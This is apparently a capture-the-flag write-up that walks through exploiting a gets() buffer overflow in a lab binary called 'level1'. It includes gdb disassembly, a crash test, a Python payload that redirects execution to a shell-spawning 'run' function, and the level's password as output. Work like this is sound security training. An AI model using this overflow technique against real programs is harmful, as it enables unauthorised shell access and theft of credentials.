As seen in the disassembled code, the program uses the gets() function to take user input :

```
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:    push   %ebp
   0x08048481 <+1>:    mov    %esp,%ebp
   0x08048483 <+3>:    and    $0xfffffff0,%esp
   0x08048486 <+6>:    sub    $0x50,%esp
   0x08048489 <+9>:    lea    0x10(%esp),%eax
   0x0804848d <+13>:   mov    %eax,(%esp)
   0x08048490 <+16>:   call   0x8048340 <gets@plt>
   0x08048495 <+21>:   leave  
   0x08048496 <+22>:   ret    
End of assembler dump.
```

By examining the man page for the gets() function, it can see that this function is deprecated and poses some significant security vulnerability:
> Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.

We try to do a buffer overflow by inputting a string exceeding 100 characters:

```
$ ./level1
letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42letest42
Segmentation fault (core dumped)
```

This confirmed the presence of a buffer overflow. Next, we determined the buffer size using gdb:
```
$ gdb ./level1
(gdb) disass main
```
We found that the buffer size is 0x50, or 80 bytes.

We then examined all functions in the program with `info functions` and identified a `run` function that calls the `system` function:
```
(gdb) info functions
0x080482f8  _init
[...]
0x08048444  run
0x08048480  main
[...]

(gdb) disass run
0x08048444 <+0>:	push   %ebp
0x08048445 <+1>:	mov    %esp,%ebp
[...]
0x08048472 <+46>:	movl   $0x8048584,(%esp)
0x08048479 <+53>:	call   0x8048360 <system@plt>
[...]

(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```
To exploit the program, we generated a string of 76 characters followed by the address of the `run` function (0x08048444) in little-endian format (\x44\x84\x04\x08):
```
$ python -c "print('-' * 76 + '\x44\x84\x04\x08')" > /tmp/test
$ cat /tmp/test - | ./level1
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```